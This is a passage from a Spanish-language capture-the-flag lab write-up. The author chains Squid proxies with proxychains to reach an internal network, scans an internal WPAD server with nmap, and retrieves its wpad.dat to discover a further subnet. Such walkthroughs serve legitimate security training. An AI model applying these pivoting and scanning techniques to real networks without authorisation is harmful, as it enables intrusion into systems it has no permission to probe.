<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.77</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D">    SERVICE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> filtered</span><span style="color:#B56959;--shiki-dark:#C3E88D"> squid-http</span></span></code></pre> 
<p>No obtenemos acceso al servidor proxy interno desde el exterior. Intentemos enrutar a través de la interfaz interna del proxy.</p>
<p>Aquí hay un esquema simplificado para explicar lo que estoy tratando de lograr:</p>
<p><img src="/_astro/image-4.gtenb2B9_ZfOST.webp" alt="alt text" width="801" height="330" loading="lazy" decoding="async"></p>
<p>La línea negra nos muestra el acceso al proxy externamente desde nuestra máquina. La línea roja muestra que no es posible el acceso directo al proxy interno desde el exterior. La línea azul nos muestra haciendo proxy a través de la interfaz interna del proxy, antes de continuar con el proxy interno.</p>
<p>Para hacer esto, debemos agregar a nuestra ProxyList:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nano</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/proxychains.conf</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span></code></pre> 
<p>Ahora deberíamos poder acceder al proxy interno (10.197.243.77).</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.77</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.77</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.16s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  squid-http</span></span></code></pre> 
<p>agreguemos este proxy a nuestra cadena.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nano</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/proxychains.conf</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 127.0</span><span style="color:#B56959;--shiki-dark:#C3E88D">.0.1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">http</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.77</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3128</span></span></code></pre> 
<p>Ahora deberíamos poder acceder a la red interna.</p>
<p><img src="/_astro/image-5.O4tlUgiO_Z1bMPUg.webp" alt="alt text" width="1353" height="515" loading="lazy" decoding="async"></p>
<h2 id="wpad-server">WPAD server</h2>
<p>Ahora que tenemos acceso a la red interna, deberíamos poder escanear el servidor wpad en busca de puertos abiertos.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains4</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.31</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Nmap</span><span style="color:#B56959;--shiki-dark:#C3E88D"> scan</span><span style="color:#B56959;--shiki-dark:#C3E88D"> report</span><span style="color:#B56959;--shiki-dark:#C3E88D"> for</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.197</span><span style="color:#B56959;--shiki-dark:#C3E88D">.243.31</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Host</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> up</span><span style="color:#393A34;--shiki-dark:#BABED8"> (0.22s </span><span style="color:#B56959;--shiki-dark:#C3E88D">latency</span><span style="color:#393A34;--shiki-dark:#BABED8">).</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">Not</span><span style="color:#B56959;--shiki-dark:#C3E88D"> shown:</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 993</span><span style="color:#B56959;--shiki-dark:#C3E88D"> closed</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ports</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">22/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ssh</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">53/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  domain</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">80/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  http</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">88/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-sec</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">464/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">  open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kpasswd5</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">749/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">  open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-adm</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  squid-http</span></span></code></pre> 
<p>Intentemos acceder al sitio web.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#B56959;--shiki-dark:#C3E88D"> firefox</span><span style="color:#B56959;--shiki-dark:#C3E88D"> wpad.realcorp.htb</span></span></code></pre> 
<p>al conectarnos a wpad.realcorp.htb, obtenemos un 403 Prohibido.
Investigacion de WPAD</p>
<p>Al investigar cómo funciona WPAD, encontré esta página web que dice lo siguiente:</p>
<p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks">https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks</a></p>
<p>“Muchos navegadores utilizan el descubrimiento automático de proxy web (WPAD) para cargar la configuración del proxy desde la red. Un servidor WPAD proporciona configuraciones de proxy del cliente a través de una URL particular (por ejemplo, <a href="http://wpad.example.org/wpad.dat)%E2%80%A6%E2%80%9D">http://wpad.example.org/wpad.dat)…”</a></p>
<p>Intentemos obtener este archivo wpad.dat del servidor.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">proxychains</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -q</span><span style="color:#B56959;--shiki-dark:#C3E88D"> curl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> wpad.realcorp.htb/wpad.dat</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">function</span><span style="color:#59873A;--shiki-dark:#82AAFF"> FindProxyForURL</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">url,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> host</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#999999;--shiki-dark:#89DDFF"> {</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">dnsDomainIs(host,</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">realcorp.htb</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8">)</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        return</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">DIRECT</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">isInNet(dnsResolve(host</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8">, </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.197.243.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">, </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">255.255.255.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">))</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        return</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">DIRECT</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    if</span><span style="color:#999999;--shiki-dark:#89DDFF"> (</span><span style="color:#59873A;--shiki-dark:#FFCB6B">isInNet(dnsResolve(host</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8">, </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.241.251.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">, </span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">255.255.255.0</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#393A34;--shiki-dark:#BABED8">))</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">        return</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">DIRECT</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">    return</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">PROXY proxy.realcorp.htb:3128</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#BABED8">}</span></span></code></pre> 
<p>Al observar el archivo wpad.dat, podemos ver que hay otra subred previamente desconocida 10.241.251.0/24.</p>
<p>Podemos usar nslookup para hacerlo.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">man</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nslookup</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">DESCRIPTION</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">	Nslookup</span><span style="color:#B56959;--shiki-dark:#C3E88D"> is</span><span style="color:#B56959;--shiki-dark:#C3E88D"> a</span><span style="color:#B56959;--shiki-dark:#C3E88D"> program</span><span style="color:#B56959;--shiki-dark:#C3E88D"> to</span><span style="color:#B56959;--shiki-dark:#C3E88D"> query</span><span style="color:#B56959;--shiki-dark:#C3E88D"> Internet</span><span style="color:#B56959;--shiki-dark:#C3E88D"> domain</span><span style="color:#B56959;--shiki-dark:#C3E88D"> name</span><span style="color:#B56959;--shiki-dark:#C3E88D"> servers.</span><span style="color:#B56959;--shiki-dark:#C3E88D">  Nslookup</span><span style="color:#B56959;--shiki-dark:#C3E88D"> has</span><span style="color:#B56959;--shiki-dark:#C3E88D"> two</span><span style="color:#B56959;--shiki-dark:#C3E88D"> modes:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> interactive</span><span style="color:#B56959;--shiki-dark:#C3E88D"> and</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    non-interactive.</span><span style="color:#393A34;--shiki-dark:#BABED8"> [...] Non-interactive mode is used to print just the name and requested information </span><span style="color:#1E754F;--shiki-dark:#89DDFF;font-style:inherit;--shiki-dark-font-style:italic">for</span><span style="color:#393A34;--shiki-dark:#BABED8"> a host or domain.</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#393A34;--shiki-dark:#BABED8">...</span><span style="color:#999999;--shiki-dark:#89DDFF">]</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">RETURN</span><span style="color:#B56959;--shiki-dark:#C3E88D"> VALUES</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">    nslookup</span><span style="color:#B56959;--shiki-dark:#C3E88D"> returns</span><span style="color:#B56959;--shiki-dark:#C3E88D"> with</span><span style="color:#B56959;--shiki-dark:#C3E88D"> an</span><span style="color:#B56959;--shiki-dark:#C3E88D"> exit</span><span style="color:#B56959;--shiki-dark:#C3E88D"> status</span><span style="color:#B56959;--shiki-dark:#C3E88D"> of</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> if</span><span style="color:#B56959;--shiki-dark:#C3E88D"> any</span><span style="color:#B56959;--shiki-dark:#C3E88D"> query</span><span style="color:#B56959;--shiki-dark:#C3E88D"> failed,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> and</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D"> otherwise.</span></span></code></pre> 
<p>Podemos usar la siguiente sintaxis para verificar si existe un host:</p>
